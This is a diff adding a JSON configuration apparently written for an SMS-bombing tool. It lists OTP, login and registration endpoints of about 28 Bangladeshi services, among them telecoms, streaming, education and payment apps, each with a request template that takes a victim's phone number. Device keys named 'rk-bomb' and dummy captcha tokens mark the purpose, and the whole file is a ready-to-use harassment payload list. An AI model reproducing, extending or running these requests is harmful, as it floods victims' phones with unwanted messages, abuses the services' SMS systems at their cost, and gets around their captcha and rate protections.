@@ -1,0 +1,196 @@
+[
+  {
+    "name": "Shadhin Music",
+    "url": "https://coreapi.shadhinmusic.com/api/v5/otp/OtpRobiReq",
+    "method": "POST",
+    "headers": { "Content-Type": "application/json" },
+    "body": "{\"msisdn\": \"880{phone_no_zero}\", \"shortcode\": 16235, \"servicename\": \"Shadhin Music\"}"
+  },
+  {
+    "name": "Khaodao (Eat-Z)",
+    "url": "https://api.eat-z.com/auth/customer/app-connect",
+    "method": "POST",
+    "headers": { "Content-Type": "application/json", "User-Agent": "okhttp/4.12.0" },
+    "body": "{\"username\": \"+88{phone_no_zero}\"}"
+  },
+  {
+    "name": "Walton Plaza",
+    "url": "https://waltonplaza.com.bd/api/auth/otp/create",
+    "method": "POST",
+    "headers": { "Content-Type": "application/json" },
+    "body": "{\"auth\": {\"countryCode\": \"880\", \"deviceUuid\": \"rk-bomb-device-uuid\", \"phone\": \"{phone_no_zero}\"}, \"captchaToken\": \"recapcha\"}"
+  },
+  {
+    "name": "Apex4u",
+    "url": "https://api.apex4u.com/api/auth/login",
+    "method": "POST",
+    "headers": { "Content-Type": "application/json" },
+    "body": "{\"phoneNumber\": \"{phone}\"}"
+  },
+  {
+    "name": "Easy.com.bd",
+    "url": "https://core.easy.com.bd/api/v1/forgot-password-otp",
+    "method": "POST",
+    "headers": { "Content-Type": "application/json" },
+    "body": "{\"device_key\": \"rk-bomb-key\", \"mobile\": \"{phone}\"}"
+  },
+  {
+    "name": "Bikroy",
+    "url": "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}",
+    "method": "GET",
+    "headers": {}
+  },
+  {
+    "name": "Chardike",
+    "url": "https://api.chardike.com/api/otp/send",
+    "method": "POST",
+    "headers": { "Content-Type": "application/json" },
+    "body": "{\"phone\": \"{phone}\", \"otp_type\": \"login\"}"
+  },
+  {
+    "name": "BTCL",
+    "url": "https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json",
+    "method": "POST",
+    "headers": { "Content-Type": "application/json" },
+    "body": "{\"phoneNbr\": \"{phone}\", \"OTPType\": 1.0, \"userName\": \"\", \"email\": \"\"}"
+  },
+  {
+    "name": "AWS POC",
+    "url": "https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send",
+    "method": "POST",
+    "headers": { "Content-Type": "application/json" },
+    "body": "{\"phone\": \"{phone}\"}"
+  },
+  {
+    "name": "Otithee",
+    "url": "https://gateway.otithee.com/api/v1/generate-otp",
+    "method": "POST",
+    "headers": { "Content-Type": "application/json" },
+    "body": "{\"request_type\": \"registration\", \"mobile_number\": \"{phone}\"}"
+  },
+  {
+    "name": "Quizgiri",
+    "url": "https://developer.quizgiri.xyz/api/v2.0/send-otp",
+    "method": "POST",
+    "headers": { "Content-Type": "application/json" },
+    "body": "{\"country_code\": \"+88\", \"phone\": \"{phone}\"}"
+  },
+  {
+    "name": "Mojaru",
+    "url": "https://new.mojaru.com/api/student/login",
+    "method": "POST",
+    "headers": { "Content-Type": "application/json" },
+    "body": "{\"mobile_or_email\": \"{phone}\"}"
+  },
+  {
+    "name": "GP MyGP",
+    "url": "https://appcity.grameenphone.com/proxy/v2/user/session/get-otp",
+    "method": "POST",
+    "headers": { "Content-Type": "application/json" },
+    "body": "{\"mobileNumber\": \"{phone}\"}"
+  },
+  {
+    "name": "Garibook",
+    "url": "https://api.garibookadmin.com/api/v3/user/login",
+    "method": "POST",
+    "headers": { "Content-Type": "application/json" },
+    "body": "{\"recaptcha_token\": \"garibookcaptcha\", \"mobile\": \"{phone}\", \"channel\": \"web\"}"
+  },
+  {
+    "name": "Bioscope Live",
+    "url": "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
+    "method": "POST",
+    "headers": { "Content-Type": "application/json" },
+    "body": "{\"number\": \"+88{phone_no_zero}\"}"
+  },
+  {
+    "name": "Bangladeshi Matrimony",
+    "url": "https://www.bangladeshimatrimony.com/register/editmobileno.php?mobileNo={phone}",
+    "method": "GET",
+    "headers": {}
+  },
+  {
+    "name": "Upay",
+    "url": "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/",
+    "method": "POST",
+    "headers": { "Content-Type": "application/json" },
+    "body": "{\"wallet_number\": \"{phone}\", \"geo_location\": {\"lat\": 23.8, \"long\": 89.1}, \"mno\": \"Robi\"}"
+  },
+  {
+    "name": "Chorki",
+    "url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en",
+    "method": "POST",
+    "headers": { "Content-Type": "application/json" },
+    "body": "{\"number\": \"+88{phone_no_zero}\"}"
+  },
+  {
+    "name": "Deepto Play",
+    "url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
+    "method": "POST",
+    "headers": { "Content-Type": "application/json" },
+    "body": "{\"number\": \"+88{phone_no_zero}\"}"
+  },
+  {
+    "name": "RedX",
+    "url": "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
+    "method": "POST",
+    "headers": { "Content-Type": "application/json" },
+    "body": "{\"phoneNumber\": \"{phone}\"}"
+  },
+  {
+    "name": "Bohubrihi",
+    "url": "https://bb-api.bohubrihi.com/public/activity/otp",
+    "method": "POST",
+    "headers": { "Content-Type": "application/json" },
+    "body": "{\"phone\": \"{phone}\", \"intent\": \"login\"}"
+  },
+  {
+    "name": "Timezone BD",
+    "url": "https://backend.timezonebd.com/api/v1/user/otp-login",
+    "method": "POST",
+    "headers": { "Content-Type": "application/json" },
+    "body": "{\"phone\": \"{phone}\"}"
+  },
+  {
+    "name": "GP Shop",
+    "url": "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp",
+    "method": "POST",
+    "headers": { "Content-Type": "application/json" },
+    "body": "{\"phone\": \"{phone}\", \"language\": \"en\", \"email\": \"\"}"
+  },
+  {
+    "name": "Shikho",
+    "url": "https://api.shikho.com/public/activity/otp",
+    "method": "POST",
+    "headers": { "Content-Type": "application/json" },
+    "body": "{\"phone\": \"{phone}\", \"intent\": \"ap-discount-request\"}"
+  },
+  {
+    "name": "Edge Course BD",
+    "url": "https://edgecoursebd.com/register",
+    "method": "POST",
+    "headers": { "Content-Type": "application/json" },
+    "body": "[{\"phone\": \"{phone}\"}]"
+  },
+  {
+    "name": "Ghoori Learning",
+    "url": "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web&_lang=bn",
+    "method": "POST",
+    "headers": { "Content-Type": "application/json" },
+    "body": "{\"mobile_no\": \"{phone}\"}"
+  },
+  {
+    "name": "Ostad",
+    "url": "https://api.ostad.app/api/v2/user/with-otp",
+    "method": "POST",
+    "headers": { "Content-Type": "application/json" },
+    "body": "{\"msisdn\": \"{phone}\"}"
+  },
+  {
+    "name": "iEducation BD",
+    "url": "https://www.ieducationbd.com/api/account/check_user",
+    "method": "POST",
+    "headers": { "Content-Type": "application/json" },
+    "body": "{\"mobile\": \"{phone}\"}"
+  }
+]
